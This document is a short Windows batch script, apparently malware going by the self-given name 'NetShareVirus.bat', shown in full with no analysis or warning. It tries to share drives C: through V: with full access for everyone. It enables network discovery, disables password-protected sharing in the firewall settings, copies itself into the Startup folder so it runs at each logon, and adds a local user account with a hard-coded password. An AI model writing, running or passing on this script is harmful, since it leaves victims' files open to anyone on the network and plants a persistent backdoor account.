@ECHO OFF
net share Ar=C: /grant:everyone,FULL
net share Ar=D: /grant:everyone,FULL
net share Ar=E: /grant:everyone,FULL
net share Ar=F: /grant:everyone,FULL
net share Ar=G: /grant:everyone,FULL
net share Ar=H: /grant:everyone,FULL
net share Ar=I: /grant:everyone,FULL
net share Ar=J: /grant:everyone,FULL
net share Ar=K: /grant:everyone,FULL
net share Ar=L: /grant:everyone,FULL
net share Ar=M: /grant:everyone,FULL
net share Ar=N: /grant:everyone,FULL
net share Ar=O: /grant:everyone,FULL
net share Ar=P: /grant:everyone,FULL
net share Ar=Q: /grant:everyone,FULL
net share Ar=R: /grant:everyone,FULL
net share Ar=S: /grant:everyone,FULL
net share Ar=T: /grant:everyone,FULL
net share Ar=U: /grant:everyone,FULL
net share Ar=V: /grant:everyone,FULL
netsh advfirewall firewall set rule group="network discovery" new enable=yes
netsh advfirewall firewall set rule group="Password protected sharing" new enable=no
copy %0 "%appdata%\Microsoft\windows\start menu\Programs\Startup\NetShareVirus.bat"
net user ArNet NetVirus3@Ven /Add